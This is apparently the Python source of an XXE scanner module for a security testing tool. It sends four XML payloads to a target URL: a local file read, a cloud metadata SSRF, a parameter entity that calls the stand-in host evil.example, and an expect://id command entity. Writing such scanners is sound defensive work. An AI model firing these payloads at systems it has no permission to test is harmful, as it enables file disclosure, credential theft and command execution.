"""XML External Entity (XXE) scanner."""
from __future__ import annotations

import hashlib
from typing import Any, Dict, List

from bugwolf.scanners import Scanner
from bugwolf.scanners.live_finding import LiveFinding


SCHEMA = "bugwolf-scanner-v1"


XXE_BODIES = (
    """<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "local-passwd-traversal-marker">]><foo>&xxe;</foo>""",
    """<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""",
    """<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/xxe">%xxe;]><foo>1</foo>""",
    """<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>""",
)


def _pid(payload: str) -> str:
    return "xxe-" + hashlib.sha256(payload.encode()).hexdigest()[:10]


class XXEScanner(Scanner):
    name = "xxe"
    description = "XML external entity injection (XXE) and SSRF via XML"
    bug_class = "xxe"
    default_severity = "critical"

    PAYLOADS = XXE_BODIES

    def matches(self, target: Dict[str, Any]) -> bool:
        return "url" in target

    def scan(self, target: Dict[str, Any], transport) -> List[LiveFinding]:
        findings: List[LiveFinding] = []
        url = target.get("url", "")
        method = str(target.get("method", "POST")).upper()
        for body in XXE_BODIES:
            try:
                resp = transport(method, url,
                                 headers={"Content-Type": "application/xml"},
                                 body=body)
            except Exception:
                continue
            rbody = (resp.get("body") or "") if isinstance(resp, dict) else ""
            indicators = ("root:x:0:0:", "ami-id", "instance-id", "evil.example",
                          "uid=", "<?xml")
            if any(ind in rbody for ind in indicators):
                findings.append(LiveFinding(
                    scanner=self.name,
                    bug_class=self.bug_class,
                    severity=self.default_severity,
                    endpoint=url,
                    method=method,
                    evidence=f"XXE payload triggered external entity resolution",
                    reproducer=f"{method} {url}  Content-Type: application/xml  body=<xxe payload>",
                    remediation="Disable DTD/external entity processing in your XML parser; use a safe library configuration.",
                    payload_id=_pid(body),
                    extra={"status": resp.get("status"), "snippet": rbody[:120]},
                ))
        return findings


__all__ = ["XXEScanner"]
